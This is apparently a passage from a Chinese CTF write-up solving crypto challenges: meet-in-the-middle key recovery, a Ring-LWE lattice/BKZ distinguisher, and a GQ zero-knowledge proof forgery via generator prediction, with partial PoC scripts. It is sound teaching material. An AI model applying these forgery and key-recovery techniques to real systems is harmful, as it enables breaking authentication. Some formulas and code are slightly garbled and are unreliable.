工作量可以再具体一点：单次lane计算约8轮、每轮5个基本操作，正向总共 `2^24` 次；把候选按20 bit一块向量化后，每块 `2^20` 个候选只需几百毫秒。正向表用 `2^24` 个 `uint64` 存48 bit指纹，约128 MiB，内存完全可控；排序 `O(2^24 log 2^24)` 是整个流程最贵的一步，但仍能在一分钟内结束。反向侧不必存表，可以流式生成指纹后立刻 `searchsorted` ，额外内存接近零。

随机碰撞的处理也需要交代清楚：期望值1意味着实际可能得到0个、1个或少数几个候选。脚本对每个命中都做一次完整16 lane重加密，只有32字节全部相等才接受，因此多出来的碰撞会被自动淘汰，不需要人为去挑“看起来最合理”的那一个。若某次运行命中0个，说明正向表或反向式的某个细节（比如第8轮是否省略末尾异或）与实际二进制不一致，应回到2.3节逐项核对，而不是扩大枚举范围。

#### 恢复结果

脚本给出的唯一命中：

```
X = 0x174812
Y = 0x1AF718
```

用这组值重新加密初始状态，得到的32字节与 `cipher.bin` 逐字节相同（脚本最后会打印 `cipher-ok=True` ）。

校验建议分三层做，任何一层不过都说明复现有偏差：先重算两段的8个轮密钥，与手工跟踪密钥扩展的结果对比，确认 `h` 的串联方式没写错；再把初始常量按小端 `uint16` 读成16条lane，完整跑完两段共16轮，逐字节比对 `cipher.bin` ；最后用 `encryptor` 本身接收候选flag文本，确认输出文件的MD5仍是 `03243ad1d8942819f4beaa67c188a578` 。三层都通过，才能说明常量表、轮顺序、“第8轮省略末尾异或”这些容易出错的细节全部正确。

#### flag的等价写法

密钥扩展中的 `v & 0xffffff` 只保留每段输入的低24 bit，因此7位十六进制数的最高4 bit不会影响轮密钥，也不会影响密文。同时，输入校验和 `strtoul` 都接受大小写。

所有形如下面的字符串都会得到完全相同的 `cipher.bin` ：

```
flag{...}
```

其中 `<h1>` 、 `<h2>` 可以是任意十六进制字符。按7位补零写法得到 `flag{0174812_01af718}` ；平台侧的答案是 `flag{...}` ，它的低24 bit同样是 `0x174812` 与 `0x1af718` ，因此与密文完全自洽。差值只出现在被 `& 0xffffff` 截掉的最高半字节上：

```
flag{0174812_01af718}  ->  X=0x174812 Y=0x1af718  == cipher.bin
flag{...}  ->  X=0x174812 Y=0x1af718  == cipher.bin（最终 flag）
flag{0174813_01af718}  ->  X=0x174813            != cipher.bin
```

把等价类数清楚会更放心。每段的低24 bit固定，最高半字节可取16种值，而校验与 `strtoul` 都接受大小写，所以每段共有 `16 + 6 = 22` 种文本形式（10个数字各1种，6个字母各2种）。此外低24 bit内部若含字母，同一数值还会因大小写再翻倍： `0x174812` 与 `0x1af718` 的固定部分里共有 `a` 、 `f` 两个字母，每个字母两写法，合计4种组合。于是等价flag总数为 `22 × 22 × 4 = 1936` 个，密文对这1936个字符串完全一致，单靠 `cipher.bin` 无法区分，只能由平台给出“官方写法”来选定。官方取值是 `h1 = h2 = '3'` 、字母全小写，即 `flag{...}` ，其低24 bit恰好等于 `0x174812` 与 `0x1af718` ，与密文自洽。

### 4\. PoC

```python
        y = (y - keys[i][:, None] - c[None, :]) & np.uint64(0xFFFF)
        y = ror(y, 3)
    return unxor_r(y, 5)

def fingerprint(lanes):
    return (lanes[:, 0] | (lanes[:, 1] << np.uint64(16))
            | (lanes[:, 2] << np.uint64(32)))

def encrypt(block, vx, vy):
    st = np.frombuffer(block, dtype='<u2').astype(np.uint64)
    for k in (schedule(vx, SEED_X), schedule(vy, SEED_Y)):
        keys = [np.full(1, t, dtype=np.uint64) for t in k]
        st = forward(st[None, :], keys, LANE_C)[0]
    return st.astype('<u2').tobytes()

def main():
    block = open('cipher.bin', 'rb').read()
    state = np.frombuffer(INIT, dtype='<u2').astype(np.uint64)
    ct = np.frombuffer(block, dtype='<u2').astype(np.uint64)

    step = 1 << 20
    fwd = np.empty(1 << 24, dtype=np.uint64)
    for base in range(0, 1 << 24, step):
        v = np.arange(base, base + step, dtype=np.uint64)
        keys = schedule_vec(v, SEED_X)
        lanes = np.broadcast_to(state[:LANES], (step, LANES)).copy()
        fwd[base:base + step] = fingerprint(forward(lanes, keys, LANE_C[:LANES]))
        print('forward', base + step, flush=True)

    order = np.argsort(fwd)
    sfwd = fwd[order]

    for base in range(0, 1 << 24, step):
        v = np.arange(base, base + step, dtype=np.uint64)
        keys = schedule_vec(v, SEED_Y)
        lanes = np.broadcast_to(ct[:LANES], (step, LANES)).copy()
        fp = fingerprint(backward(lanes, keys, LANE_C[:LANES]))
        pos = np.searchsorted(sfwd, fp)
        pos[pos >= len(sfwd)] = 0
        hit = sfwd[pos] == fp
        for idx in np.nonzero(hit)[0][:4]:
            x, y = int(order[pos[idx]]), base + int(idx)
            print('candidate X=%#x Y=%#x cipher-ok=%s'
                  % (x, y, encrypt(INIT, x, y) == block), flush=True)
            print('flag form: flag{%07x_%07x}' % (x, y), flush=True)
```

* * *

## Crypto3-hoRRibleRing

### 1\. 题目信息

| 项目  | 内容  |
| --- | --- |
| 分类  | Crypto |
| 形态  | 附件题 |
| 附件  | hoRRibleRing_387f520883f218a707f3a963fc9aa014.zip，内含task.sage（9869字节）与samples.txt（3.7 MB） |
| 目标  | 无（离线附件） |

Flag：flag{a5c0e489-a8e6-4532-b03a-f875461165cd}

### 2\. 题目分析

#### 样本生成本身就是一位一题

`task.sage` 的核心只有几行：

```python
p = 0x3ac01f87                      # 985669511，素数
f = x^512 + 885977155*x^511 + ... + 309893591*x + 500564413   # 512 次首一多项式
n = f.degree()                      # 512

def F0():                                    # bit = 0
    s = PR([D() for _ in range(n)])           # 离散高斯，sigma=3.371
    e = PR([D() for _ in range(n)])
    a = PR([randbelow(p) for _ in range(n)])  # 均匀
    b = (a*s + e) % f
    return [a.list(), b.list()]

def F1():                                    # bit = 1
    a = PR([randbelow(p) for _ in range(n)])
    b = PR([randbelow(p) for _ in range(n)])
    return [a.list(), b.list()]

s.write("output =" + str([F0() if i == "0"else F1()
                          for i in bin(bytes_to_long(flag))[2:].zfill(len(flag)*8)]))
```

flag的每一位对应一个样本：

| bit | 样本  |
| --- | --- |
| `0` | 一条Ring-LWE样本 `b = a·s + e (mod f)` ， `s, e` 都是σ=3.371的离散高斯 |
| `1` | `(a, b)`<br><br>完全均匀随机 |

样本顺序就是flag的大端bit串，每8个样本拼一个字节。

**把环摊平成512维。** 代码里 `s` 、 `e` 、 `a` 、 `b` 都是 `R_p = F_p[x]/(f)` 的元素，而 `f` 的次数是512，所以 `R_p` 作为 `F_p` -向量空间的维数就是512，基取 `1, x, ..., x^511` ，一个元素等价于一个512维系数向量。乘法不是逐坐标的：先做多项式乘法，再把次数≥512的部分按 `x^512 = -(f_0 + ... + f_511 x^511)` 折回。但把 `a` 固定成常数之后，映射 `s ↦ a·s mod f` 是 `F_p` -线性的，幂基下就是一个512×512矩阵 `M_a` ：第一列是 `a` 本身，之后每一列都是前一列“乘 `x` 再折回”，结构接近循环矩阵，折回系数由 `f` 决定。只要 `gcd(a,f)=1` （ `f` 无重因子、 `a` 随机，概率约 `1-1/p` ）， `M_a` 就可逆，于是 `b` 与 `a` 之间不存在“能不能表示”的差别，能携带信息的只剩“表示系数有多小”。

#### 参数核对

先做最基础的核对，这些数字后面全都用得上：

| 项   | 值   |
| --- | --- |
| `p` | `985669511 = 2^29.88` |
| `n = deg f` | `512` |
| `σ` | `3.371`<br><br>（系数几乎都落在 `[-15,15]` ） |
| 样本数 | `336`<br><br>→336 bit = `42` 字节 |
| `p/σ` | `2^28.1` |

42字节正好是 `flag{` +36字符UUID+ `}` 的长度，用这个一致性可以确认“每个bit一个样本、按大端bit序”的解读没错：

```python
>>> bits = ''.join(format(c,'08b') for c in b"flag{...}")
>>> bits[:<端口>]   -> 0110011001101100011000010110011101111011  == b"flag{"
>>> bits[-8:]   -> 01111101                                   == "}"
>>> bits.count('0'), bits.count('1') -> 181, 155
```

即336个样本里预期有181个是F0、155个是F1，与最终读出的flag自洽。

#### 判定问题归约成search-LWE

一个样本 `(a, b)` 满足什么？

-   若bit = 0：存在小的 `s, e` （ `||s||∞, ||e||∞ ≲ 15` ）使 `b = a·s + e mod f` ；
    
-   若bit = 1：不存在这样的 `s` 。
    

因为 `a` 在 `R_p = F_p[x]/(f)` 中几乎必然可逆，任意 `b` 都能写成 `a·s' + e'` （取 `s' = a^{-1}(b-e')` ），所以“能否线性表示”这件事本身不含信息；唯一的信息是 `(s, e)` 能同时很小。这正是一个标准的search-LWE：给定 `(a, b)` ，找小向量 `(s, e)` 。

**两个分布只差在一个“小”字。** 严格按照分布写， `F0` 输出 `(a, a·s+e)` ，其中 `(s,e)` 服从 `Z^{2n}` 上的离散高斯 `D_{Z^{2n},σ}` ； `F1` 输出 `(a, u)` ， `u` 在 `R_p` 上均匀。这两个分布在计算上不可区分，正是Ring-LWE的判定版本（decisional Ring-LWE）。方向上也很清楚：能区分就能在 `a·Z^n` 这个格上解“带噪最近向量”从而恢复 `s` ；反过来有了 `s` 就能算出 `e` 并检查它小不小。所以本题不是求一个全局结论，而是把同一个判定问题独立实例化336次，逐条回答0/1——每条样本的答案互不影响。

于是判定规则很干净：

> 能在格 `Λ = {(p z + M_a s, s)}` 里找到长度~10²的向量，当且仅当bit = 0。

其中 `M_a` 是“乘 `a` 再模 `f` ”这个线性映射在幂基下的512×512整数矩阵。注意这里是整数格：系数先按模 `p` 的中心代表元取 `[-p/2, p/2]` ， `p·z` 负责消去 `p` 的倍数。

#### 格建

`mult_matrix(a, f)` 逐列生成 `a·x^j mod f` 。因为 `f` 首一，有

\[ x^{512}=-(f_0+f_1x+\\cdots+f\_{511}x^{511}), \]

所以从 `a·x^j` 右移一位得到 `a·x^{j+1}` 时，最高位系数 `top` 要按上式折回低位：

```
nxt[0] = (-top * f[0]) % p
nxt[i] = (cur[i-1] - top * f[i]) % p      # i = 1..511
```

于是 `a·s mod f = Σ_j s_j · cols[j]` ， `cols[j]` 正好是 `M_a` 的第j列。取格子

```
        ┌ p·I_n   0    0 ┐        Λ ∋ (p·z + M_a·s , s , 0)
    B = │  M_a    I_n   0 │        det Λ = p^n
        └   b      0    K ┘        Λ ∋ (b - M_a·s - p·z , -s , K) = (e, -s, K)
```

最后一行是Kannan embedding：把目标 `(b,0)` 塞进去。取 `K=1` ，并令 `z` 由 `b - M_a s - e ≡ 0 (mod p)` 逐坐标给出，则目标向量 `(e,-s,K)` 本身就是格里的一个向量。格的秩是 `2n+1 = 1025` ，行列式是 `p^n` ，与 `s` 无关，因此每个样本的格结构完全一致，只有最后一行随 `b` 变化。

**几处容易忽略的细节。** 一是 `det` 怎么来：按 `n + n + 1` 分块，左上角 `[[p·I, 0], [M_a, I]]` 是下三角分块矩阵，对角块行列式相乘得 `p^n·1` ，末行只动最后一个坐标，所以 `det B = p^n` 与 `a` 、 `b` 都无关——这也是336个格“难度相同”的原因。二是 `p·I` 只占前 `n` 列： `z` 的作用就是把 `M_a·s` 与 `b` 的差补齐成 `p` 的整数倍，让 `e` 落在居中代表元 `[-p/2, p/2]` 上；若不做居中， `e` 会被写成接近 `p` 的正数，长度立刻变成 `~p√n` ，短向量根本不存在。三是最后一列只有末行有 `K` ：任何用到末行的整数组合末坐标都是 `±K` ，否则恒为0，于是 `row[2n]=±1` 就是“这行是Kannan行”的指纹，而 `row[n:2n]` 正好是被嵌入的 `±s` 。四是 `K` 取1：它只负责标记“带 `b` 的组合”，取大了反而拉长目标向量、削弱它与普通短向量的差距。

#### gap大小与可解性

```
dim Λ       = 2n+1 = 1025
det Λ       = p^512
det^(1/d)   = 31080
Gaussian heuristic = det^(1/d)·sqrt(d/2πe) ≈ 2.4×10^5
目标向量    ||(e,-s)|| ≈ sqrt(2n)·σ ≈ 108
gap         ≈ 2232×
```

`Λ` 里“普通”的短向量长度是~2.4e5，而目标只有108，比格里的其它向量短2200倍，是一个非常极端的uSVP（unique-SVP）实例。这种“gap巨大”的实例正是BKZ最擅长的情况：不需要把格约化到很好，只要能把这一个异常向量“顶”到基里就行。

**uSVP、BKZ与“判1”的本质。** uSVP指的是 `λ_2/λ_1` 很大的格：这里 `λ_1 ≤ ||(e,-s,1)|| ≈ 108` ，其余向量的长度都在Gaussian heuristic `2.4×10^5` 附近，unique gap≈2200。BKZ-β的根Hermite因子是 `δ_β` ，能把基中最短向量压到约 `δ_β^{d}·det^{1/d}` ；要让它低于 `2.4×10^5` 、也就是把异常向量从背景里挤出来，需要 `δ_β^{1025} ≲ 2200` ，即 `δ_β ≲ 1.0075` ，对应 `β` 一百以上——这就是下表 `β≈120` 的来源。作为对照，LLL的 `δ≈1.0219` 给出 `1.0219^{1025} ≈ 4×10^9` ，差了六个数量级，所以LLL在这里毫无希望，必须上BKZ。反过来，对bit=1的样本，格中最短向量就是约 `2.4×10^5` 的普通向量， `β` 再大也只能把它约到 `δ_β^{d}·det^{1/d}` ，永远碰不到 `10^2` 量级；“找不到”本身就是答案，只是它只能以“约化后最短行长什么样”这种统计证据出现，必须配合复算与边界 `BOUND` ，而不能看到“最短行不太长”就判0。

#### 环的可分解性

`f` 看起来像随机多项式，其实在 `F_p` 上是完全可约的：用distinct-degree加equal-degree分解可以得到261个不可约因子，次数分布为

```lua
deg 1: 140   deg 2: 56   deg 3: 28   deg 4: 19   deg 5: 8   deg 6: 10
```

随机512次多项式期望只有~1个线性因子，这里有140个，说明 `f` 是刻意构造成“光滑”的。于是

\[ R_p=\\mathbb F_p\[x\]/(f)\\cong\\prod\_{i=1}^{261}\\mathbb F\_{p^{d_i}},\\qquad d_i\\le 6. \]

直觉上会想：既然能CRT拆成261个6次以内的小域，那就在每个分量里解LWE。这条路走不通，因为误差在分量里不再小：

```lua
e 的系数：        max|e_j| = 10 ~ 13                 （极小）
e mod g（deg 1）：max|centered| = 4.3e8, 2.9e8, 1.3e8  （完全均匀）
e mod g（deg 6）：max|centered| = 4.7e8, 4.4e8, 4.5e8  （p/2 = 4.9e8）
```

`e` 是次数511、系数≤13的多项式，除以6次因子 `g` 后商的系数是~p量级的随机数， `e - q·g` 把小系数彻底搅匀。所以“小”这个性质只存在于系数基（幂基）下，CRT分量里既没有小误差也没有小秘密；何况每个分量只有d个方程、2d个未知数。

结论： `f` 光滑是硬化而不是软化，本题唯一有效的攻击就是整格上的uSVP。标题里的“Ring”三个R，指的就是这个“环不是域”的事实。

### 3\. 解题过程

#### 解析参数与样本

`f` 的513个系数要从 `task.sage` 里抽出来，最容易出错的是 `x^1` 项和常数项（它们没有 `*x^k` 的写法）。脚本按项解析：从 `f =` 截到 `f.degree()` ，按 `+/-` 切成项，含 `x` 的取指数，其余当常数项，最后校验 `x^512` 的系数为1。

`samples.txt` 是 `output = [[[...],[...]], ...]` 的形式，去掉前缀后用 `ast.literal_eval` 一次性读入，得到336个 `(a, b)` ，每个是长度512的整数列表。

这里有两个坑。第一， `bin(bytes_to_long(flag))[2:]` 会丢掉flag最高字节的前导零，而 `zfill(len(flag)*8)` 把长度补回 `8·len(flag)` ，所以样本总数必然是8的倍数；336/8=42正好是 `flag{` +36字符UUID+ `}` ，这也反向确认了解析出的样本数没多没少。第二， `b` 的系数读进来已是模 `p` 的代表元，不需要再约化；但还原 `e` 时必须先 `% p` 再居中到 `[-p/2, p/2]` ，否则 `b - a·s` 的负值会被写成大正数，长度判断直接失效。

#### 构造格子

对每个样本先算 `cols = mult_matrix(a)` （512次多项式移位，每次512次乘加，纯Python约0.1秒），再按2.4节拼出 `1025×1025` 的整数矩阵：

-   前512行是 `p·I` ；
    
-   接着512行是 `M_a` 的列加单位向量；
    
-   最后一行是 `b` 、零向量、 `K=1` 。
    

#### BKZ约化与复算校验

约化完把每一行拿去验证，不做“看起来短就算”的判断，而是真的把 `a·s + e` 复算一遍：

-   只接受带 `K=±1` 的Kannan行；
    
-   `s` 的符号未知， `row[n:2*n]` 与取负两个方向都试；
    
-   要求 `max|s_i| ≤ BOUND` 且复算出的 `e = b - a·s mod f` 居中后也 `≤ BOUND` ；
    
-   两向都不满足才判bit = 1。
    

`BOUND=40` 是 `12σ` ，误判概率可忽略：随机行恰好让512个系数全落在 `[-40,40]` 里的概率是 `(81/p)^512` 。

注意这个校验是单边的：判0有构造性证据（真的给出了 `s` ，代回去误差确实小），判1只有“约化后没有任何一行通过”这个否定证据。因此流程上总是先按较低的 `β` 跑，通过就立刻停；只有跑完仍不通过才判1。若某样本在 `β=80` 下判1、在 `β=120` 下判0，说明是 `β` 不够而不是样本随机，这也正是要用更高 `β` 复核所有判1样本的原因。

#### 复杂度：本题horrible的地方

单样本的uSVP gap决定所需BKZ block size。用标准估计条件

\[ \\sigma\\sqrt{\\beta}\\le \\delta\_\\beta^{2\\beta-d-1}\\cdot p^{m/d}, \\qquad m=n=512,\\ d=1025 \]

得到：

| β   | δ\_β | RHS | LHS = σ√β | 够用  |
| --- | --- | --- | --- | --- |
| 40  | 1.01254 | 0.24 | 21.3 | 否   |
| 60  | 1.01145 | 1.03 | 26.1 | 否   |
| 80  | 1.01026 | 4.49 | 30.2 | 否   |
| 100 | 1.00926 | 15.4 | 33.7 | 否   |
| 120 | 1.00844 | 42.2 | 36.9 | 是   |
| 140 | 1.00775 | 97.7 | 39.9 | 是   |
| 200 | 1.00628 | 616 | 47.7 | 是   |

即估计器给出 `β ≈ 120` 。这类估计对中等 `β` 偏保守，实测常从60~80起，不成功再往上加。维度1025、β~100的BKZ，用 `fpylll` 是“几十分钟/样本”量级，用G6K（sieving BKZ）可以压到分钟级。

而题目要判336个样本：其中181个是F0，必须真的解出 `s` 才能判成0；另外155个无论 `β` 多大都找不到短向量，只能靠“跑完约化、什么也没找到”来排除。没有一个能省掉。工程上的做法是：

1.  分片： `--start/--end` 把336个样本摊到多台机器/多个进程上，互不依赖；
    
2.  用 `BKZ.Param(block_size=β, max_loops=4, flags=BKZ.AUTO_ABORT)` 让它在收敛后自动提前退出；
    
3.  用已知明文校准 `β` ： `flag{` 给出bit 0–39的40个已知标签、 `}` 给出bit 328–335的8个，先在这48个样本上跑一遍，确认“0能还原出s、1还原不出”，再放开全量；
    
4.  一旦某行通过复算就立即判0并停止加 `β` ；只有始终找不到才判1，判1时通常还要把 `β` 抬高再跑一遍以降低误判。
    

#### 拼位得到flag

336个bit按样本顺序拼成字符串，每8位按大端还原一个字节：

```python
bitstr = "".join(str(bits[i]) for i in range(336))
flag   = bytes(int(bitstr[i:i+8], 2) for i in range(0, 336, 8)).decode()
```

得到 `flag{...}` ，其中 `flag{` 与结尾的 `}` 恰好落在第0–39位和第328–335位，与用于校准的已知明文完全一致。

拼位时有两个方向都不能错：位序按样本下标从小到大（ `task.sage` 的列表推导按bit串从左到右生成，即flag的大端bit序），组字节时每个字节内部高位在前（ `int(bitstr[i:i+8], 2)` 等价于按 `<<7, <<6, ..., <<0` 加权）。任一处反过来，得到的字节串长度仍是42但会是乱码；用前40位必须等于 `b"flag{"` 、末8位必须等于 `}` 这48个已知位做双向校验，可以在拼装阶段就发现位序错误，而不必回头重跑336次约化。同理，若某一位的判定存疑，它的影响仅限于对应字节，可单独复跑该样本，不必重做整批。

### 4\. PoC

```python
    A = IntegerMatrix.from_matrix(build_basis(cols, b))
    LLL.reduction(A)
    BKZ.reduction(A, BKZ.Param(block_size=BETA, max_loops=4,
                                flags=BKZ.AUTO_ABORT))
    for i in range(2 * N + 1):
        if try_row([int(v) for v in A[i]], b, cols):
            return0
    return1

def _init(sage_path, beta):
    global F, P, BETA
    P = load_p(sage_path)
    F = load_f(sage_path)
    BETA = beta

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--sage', default='task.sage')
    ap.add_argument('--samples', default='samples.txt')
    ap.add_argument('--bkz', type=int, default=80)
    ap.add_argument('--jobs', type=int, default=1)
    ap.add_argument('--start', type=int, default=0)
    ap.add_argument('--end', type=int, default=0)
    ap.add_argument('--out', default='bits.json')
    args = ap.parse_args()

    samples = load_samples(args.samples)
    end = args.end or len(samples)
    todo = list(range(args.start, end))
    bits = {i: Nonefor i in range(len(samples))}

    if args.jobs <= 1:
        _init(args.sage, args.bkz)
        for i in todo:
            bits[i] = decide(samples[i])
            print('sample %d -> %d' % (i, bits[i]), flush=True)
    else:
        with ProcessPoolExecutor(max_workers=args.jobs, initializer=_init,
                                 initargs=(args.sage, args.bkz)) as pool:
            for i, bit in zip(todo, pool.map(decide, [samples[i] for i in todo])):
                bits[i] = bit
                print('sample %d -> %d' % (i, bit), flush=True)

    Path(args.out).write_text(json.dumps(bits), encoding='utf-8')
    if all(v isnotNonefor v in bits.values()):
```

* * *

## Crypto4-zkRSA

### 1\. 题目信息

| 项目  | 内容  |
| --- | --- |
| 分类  | Crypto |
| 形态  | 混合题（附件+容器） |
| 附件  | zkRSA_a8dd12dec43e9f9c36aac8f952cae6cd.zip，内含task.py、requirements.txt、flag.txt、README.md |
| 目标  | 容器  |

Flag：flag{动态容器已脱敏}

### 2\. 题目分析

**P/V协议。** 服务端实现的是GQ身份证明：私钥 `x` ，公钥 `y=x^e mod n` 。 `P` 取随机数 `r` ，先给承诺 `com=r^e mod n` ，由 `com` 的哈希派生挑战 `chal∈[0,e)` ，再回 `res=r*x^chal mod n` ；验证只需 `res^e ≡ com*y^chal (mod n)` 。本题 `e=2` ，所以 `chal` 只可能是0或1， `com` 必是模 `n` 的二次剩余。

`V` 却把私钥本身当成了校验指数：

```python
y = pow(bytes_to_long(FLAG.encode()), x, n)
com = int(input("com>"))
chal = next(gen) % x
res = int(input("res>"))
assert pow(res, x, n) == com * pow(y, chal, n) % n
```

`y` 在读取 `com` 之前就已打印。只要猜中 `chal=c` ，令 `com=y^(-c) mod n` 、 `res=1` ，则左边 `1^x=1` ，右边 `y^(-c)*y^c=1` ，校验必然通过，无须求flag的 `x` 次根。难点只剩 `chal=next(gen) % x` ：要知道未公开的 `x` ，还要知道生成器的下一个输出。

**生成器结构。** `ECGenerator` 的构造是：

-   取两个256 bit素数 `p, q` 且 `p≡q≡3 (mod 4)` ，令 `n=p*q` ，系数 `a, b` 随机，曲线 `Y²=X³+aX+b` 定义在 `Z_n` 上；
    
-   初始点 `A` 由 `E_p` 、 `E_q` 上各取随机点再用CRT拼成；
    
-   预置 `k=16` 个固定平移点 `Ds` ；
    
-   `__next__()` 输出当前点横坐标，再用 `int(A[1]) % 16` 选一个 `Ds[ind]` 做加法来更新 `A` 。
    

所以下一步只有16种可能：当前点 `(X,Y)` 已知时，下一个横坐标由16个固定平移点之一决定，选中哪个只看未公开的纵坐标模16。预测因此不是复现随机数，而是把16个候选全部算出来、赌一个。

**协议层面的两处失效。** GQ的可靠性原本依赖两点： `chal` 足够长，以及单轮通过概率 `1/e` 足够小从而重复多轮把欺骗概率压下去。本题 `e=2` ，单轮通过概率天生就是 `1/2` ，而服务端只跑一轮；更要紧的是零知识性所依赖的前提—— `com` 必须真的来自某个随机 `r` 的 `e` 次幂——从未被检查。验证式只约束三者的代数关系，不约束 `com` 的来历，于是攻击者可以按 `y` 反推 `com` 。把两个接口分开看： `P` 是一台泄露横坐标的预言机（ `chal=0` 时 `res` 直接给出 `r` ）， `V` 是一台接受任意 `com` 的宽松验证器。单看任何一个都不够，合起来才构成完整攻击链—— `P` 提供样本以恢复参数， `V` 提供免费的flag泄漏点。

**被打破的是可枚举性而非随机性。** 每步只有16个候选这一事实，把"预测下一位输出"从"恢复内部状态"降级为"解一组代数方程"：已知当前横坐标 `X` ，对16个固定平移点分别解 `F(X,Z;u_j)=0` 即得16个 `Z_j` ，真实输出必在集合内，与隐藏索引取到哪个无关。 `Ds` 在构造时一次性生成、此后固定，这正是攻击可行的关键——同一组 `(u_j,v_j)` 在每一步复用，恢复成本只付一次；若每步重采平移点，16个候选就得逐步重算，难度完全不同。出题人选16也有讲究：太小则候选集合小到可以盲试而不必做代数恢复，太大则一次会话内无法把候选全部算出，16正好让"代数恢复"成为必需、又让"枚举加猜"仍然经济。

**两个难点是串联的。** 预测 `chal` 要对 `x` 取模，故必须先有 `x` ；求 `x` 要用曲线参数与加法公式，故必须先有 `n` 与 `(a,b,D)` 。顺序固定为 `n → (a,b,D) → x → c` ，任一环算错，最后的表现都是16个候选全不中，与"猜错"不可区分。这也是全流程必须处处自检的原因：只在最后一步失败无法定位问题，只能靠每一步独立的同余检查逐步确认。

### 3\. 解题过程

#### 由证明记录求n

`P` 用 `e=2` ，每条记录 `(com, chal, res)` 满足 `com=r²` 、 `res=r*x^chal (mod n)` ，其中 `r` 正是生成器当时输出的横坐标。 `chal=0` 时 `res=r` ，坐标直接泄露，于是 `Δ_i=res_i²-com_i` 都是 `n` 的倍数：

\[ n=\\gcd_i\\left(\\mathrm{res}\_i^2-\\mathrm{com}\_i\\right). \]

这里有一个容易被忽略的细节： `chal=1` 的记录同样可用。此时 `res=r*x` ，于是 `res²-com=r²(x²-1)` ，仍然是 `n` 的倍数；无论挑战是0还是1，每条记录都提供一个 `n` 的倍数， `chal=0` 只是额外把 `r` 直接暴露出来，方便事后抽查。实际操作取三到五条记录求gcd即可：单条 `Δ` 含大素因子，几条互素的概率极高，gcd几乎必然收敛到 `n` 本身，多取反而可能因为某条记录让 `Δ` 含额外小因子而引入噪声。

验证方式：取几条记录的gcd后检查位数为512 bit、能整除全部 `Δ_i` ，再抽查 `chal=0` 记录满足 `res² mod n == com` ；若得到的是 `n` 的倍数，除掉小因子即可。全程不分解 `n` 。这样得到的模数与生成器内部使用的 `n` 完全一致，后续所有同余运算都在同一模数下进行；一旦 `n` 错了，后面的线性消元会立刻退化，因此这也是一道天然的自检。

#### 恢复平移点与曲线参数

设当前点 `P=(X,Y)` 加上固定点 `D=(u,v)` 后横坐标为 `Z` 。消去纵坐标得到只含 `X,Z,u` 的双二次关系：

\[

\]

只有16个 `D` ，故所有相邻横坐标对 `(X_i, X_{i+1})` 都落在16条这样的曲线上。把 `F` 视作五个系数 `c2..c6` 的线性式，取四条归属同一 `D` 的坐标对即可解出，其中还剩一个自由参数 `t` ；利用恒等式

\[ 4c_3=c_2^2,\\qquad 4c_6=c_4^2-2c_2c_5-c_4c_2^2 \]

（关于 `t` 分别为二次、三次）消去 `t` ，再回代得到 `u, a, b` 。实际操作是随机抽样凑齐四对同类坐标，只需线性代数与 `gcd` 求逆，不对合数模数开方。

这一步的真正意义在于把"预测下一个输出"化归为纯代数。16个平移点 `D_j=(u_j,v_j)` 是构造时一次性生成、此后永不改变的常量，所以每条记录、每一步用的都是同一组 `(u_j,v_j)` ，变的只是当前点。给定当前横坐标 `X` 与某一对 `(u_j,v_j)` ，下一横坐标 `Z` 由 `F(X,Z;u_j)=0` 唯一确定（另一支对应 `P-D_j` ，可用后续记录排除）。因此只要恢复出 `a, b` 与16组平移参数，就能对任意当前点算出全部16个候选 `Z_j` ，既不需要知道纵坐标 `Y` ，也不需要知道隐藏索引 `int(A[1]) % 16` 到底取了哪个。

#### 求x并验证

`chal=1` 的记录里 `com=Z²` 而 `Z` 未知。取前一条 `chal=0` 的横坐标 `X` 和已恢复的 `F(X,Z;u)=0` ，代入 `Z²=com` 后 `F` 对 `Z` 退化成一次方程，解出 `Z` 并用 `Z²≡com` 过滤。该记录又给出 `res=Z*x mod n` ，故

\[ x=\\mathrm{res},Z^{-1}\\pmod n. \]

验证：对全部记录令 `r=res*x^(-chal) mod n` ，检查 `r²≡com` ；若条条成立，说明 `n` 与 `x` 都正确。

#### 算出16个候选横坐标

已知 `a, b` 后， `F(X,Z;u)=0` 对 `u` 是二次方程，取两条同一平移点的坐标对相减即得一次式，可从记录中找齐16个 `u` 并标注每步用了哪个平移点。令 `f(T)=T³+aT+b` ，

\[ S(X,Z,u)=(X+Z+u)(X-u)^2-f(X)-f(u), \]

加法公式给出 `S=-2Yv` ；反向看同一条边可算 `Y'v` 。两步共用中间点处， `Y'v_i` 与 `Y'v_j` 相除得 `v_j/v_i` ，记录连成图后即得16个纵坐标相对基准的比例，仍不需开方。已知最后一步的 `Yv_i` ，即可对每个 `j` 求出 `Yv_j` 并得到

\[ Z_j=\\frac{f(X)+f(u_j)-2Yv_j}{(X-u_j)^2}-X-u_j\\pmod n. \]

#### 预测chal、伪造并取flag

`V` 消耗的正是生成器下一个输出： `chal=next(gen) % x` 。末次 `P` 的横坐标 `X` 已知，故3.4算出的16个 `Z_j` 就是 `next(gen)` 的全部可能取值，对每个候选取模即得 `c_j=Z_j mod x` 。由于 `Z_j` 是模 `n` 的512 bit量级整数， `x` 也是同量级随机数， `Z_j mod x` 近似均匀，16个候选一般互不相同，也没有额外信息可用于排序，只能任取一个 `c` 去赌，单次命中率约 `1/16` 。

在 `V` 打印 `y` 之后提交 `com=y^(-c) mod n` 、 `res=1` 。校验式是 `pow(res,x,n) == com*pow(y,chal,n)%n` ：左边 `1^x=1` ；一旦命中使 `chal=c` ，右边 `y^(-c)*y^c=y^0=1` ，两边恒等。注意这里的指数是 `x` 而不是 `e` ，但 `res=1` 让左边与指数无关，所以等式能否成立只取决于 `c` 是否等于 `chal` ，与 `x` 的具体取值无关， `x` 只在预测 `chal` 时被用到。

`com` 与 `res` 还必须落在 `(0,n)` 内： `y` 是flag的幂，flag的字节数远小于 `n` 的256 bit素因子， `gcd(y,n)=1` 几乎必然成立， `y^(-c)` 就是普通的模逆，结果自然合法， `res=1` 也满足范围检查。若隐藏索引恰好命中，服务打印：

```
Good job! Here is your flag: flag{动态容器已脱敏}
```

**flag的RSA根为何不必求。** 常规伪造GQ证明要从 `y` 解出 `x` 次根，即由 `y=flag^x mod n` 反推flag，这等同于在不知道 `n` 分解的情况下解RSA，代价极大。本题绕开了这一点： `com` 不再是某个随机 `r` 的 `e` 次幂，而是按公开的 `y` 构造的 `y^(-c)` ，使验证等式退化成恒等式；服务端只检查取值范围和这条等式，并不检验 `com` 是否真来自某个已知的 `r` 。所以攻击者所需的输入只有服务在读 `com` 前打印的 `y` 和一个正确的 `chal` 预测，flag本身始终没有被求出。

